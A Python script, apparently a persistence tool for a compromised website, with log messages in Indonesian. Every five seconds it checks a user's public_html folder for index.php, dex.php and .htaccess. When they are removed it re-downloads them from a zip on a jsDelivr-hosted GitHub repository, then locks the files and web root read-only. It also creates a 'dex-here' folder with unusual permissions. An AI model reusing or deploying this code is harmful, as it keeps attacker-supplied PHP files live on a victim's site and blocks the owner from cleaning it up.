import os
import time
import datetime
import urllib.request
import zipfile
import io


TARGET_FOLDER = '/home/marion/public_html'
DEX_FOLDER = os.path.join(TARGET_FOLDER, 'dex-here')
BACKUP_ZIP_URL = 'https://cdn.jsdelivr.net/gh/kora-kora-2/zip@main/private/marionrehwinkeljewellery.zip'
ITEMS_TO_PROTECT = ['index.php', 'dex.php', '.htaccess']
LOG_FILE = '/home/marion/tmp/restore.log'

def log_message(msg):
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    line = f"[{timestamp}] {msg}"
    print(line) 
    try:
        os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
        with open(LOG_FILE, 'a') as f:
            f.write(line + '\n')
    except:
        pass

def force_restore_items(url, target, items):
    try:
        
        with urllib.request.urlopen(url) as response:
            zip_data = response.read()
        
        with zipfile.ZipFile(io.BytesIO(zip_data), 'r') as zip_ref:
            
            os.chmod(target, 0o755)
            
            for item in items:
                item_path = os.path.join(target, item)
                
                
                if os.path.exists(item_path):
                    os.chmod(item_path, 0o644)
                    os.remove(item_path)
                
                
                zip_ref.extract(item, path=target)
                
                
                os.chmod(item_path, 0o444)
                
        log_message(f"Berhasil memulihkan: {', '.join(items)}")
        return True
    except Exception as e:
        log_message(f"Gagal restore: {str(e)}")
        return False

log_message("Python Protection Started (dex-here 0363 Mode)")

while True:
    try:

        need_restore = False
        for item in ITEMS_TO_PROTECT:
            if not os.path.exists(os.path.join(TARGET_FOLDER, item)):
                need_restore = True
                break
        
        if need_restore:
            log_message("Deteksi perubahan! Mengembalikan file dari GitHub...")
            force_restore_items(BACKUP_ZIP_URL, TARGET_FOLDER, ITEMS_TO_PROTECT)

        if not os.path.exists(DEX_FOLDER):
            os.chmod(TARGET_FOLDER, 0o755)
            os.makedirs(DEX_FOLDER, mode=0o755, exist_ok=True)

        os.chmod(TARGET_FOLDER, 0o555)

        os.chmod(DEX_FOLDER, 0o363)

        for item in ITEMS_TO_PROTECT:
            path = os.path.join(TARGET_FOLDER, item)
            if os.path.exists(path):
                os.chmod(path, 0o444)

    except Exception as e:
        log_message(f"Error: {str(e)}")
    
    time.sleep(5)